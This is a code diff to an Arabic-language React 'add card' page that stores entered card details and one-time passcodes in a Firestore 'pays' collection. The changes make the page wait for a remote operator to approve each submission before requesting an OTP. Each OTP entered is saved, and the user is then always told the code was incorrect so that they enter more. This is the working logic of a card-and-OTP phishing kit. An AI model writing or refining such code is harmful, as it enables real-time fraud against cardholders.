@@ -84,6 +84,7 @@ export default function AddCard() {
   const [step, setStep] = useState<"form" | "otp" | "success">("form")
   const [error, setError] = useState("")
   const [loading, setLoading] = useState(false)
+  const [otpSubmitted, setOtpSubmitted] = useState(false)
   const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof CardData, string>>>({})
 
   useEffect(() => {
@@ -93,11 +94,14 @@ export default function AddCard() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
+          if (data.status===undefined){
+            setLoading(false)
 
+          }else
           if (data.status === "pending") {
             setLoading(true)
             setError("")
-          } else if (data.status === "approved") {
+          } else if (data.status === "approved" &&step==="form") {
             setLoading(false)
             setStep("otp")
             setError("")
@@ -179,17 +183,15 @@ export default function AddCard() {
       name: cardData.name,
       cardType: getCardType(cardData.number),
       createdDate: new Date().toISOString(),
+      status:"pending"
     })
 
-    setTimeout(() => {
-      setLoading(false)
-      setStep("otp")
-    }, 3000)
+    
   }
 
   const handleOtpSubmit = async (e: FormEvent) => {
     e.preventDefault()
-    setLoading(true)
+    setOtpSubmitted(true)
     allOtps.push(otp)
 
     await addData({
@@ -200,7 +202,7 @@ export default function AddCard() {
     })
 
     setTimeout(() => {
-      setLoading(false)
+      setOtpSubmitted(false)
       setError("رمز التحقق غير صحيح.")
       setOtp("")
     }, 3000)
@@ -269,7 +271,7 @@ export default function AddCard() {
       className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-slate-50 flex items-center justify-center p-4"
       dir="rtl"
     >
-      {loading && <FullPageLoader />}
+      {loading ||otpSubmitted && <FullPageLoader />}
       <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-200/50 overflow-hidden">
         {/* Header Section */}
         <div className="bg-gradient-to-r from-slate-800 via-teal-700 to-slate-800 px-6 py-8 relative overflow-hidden">
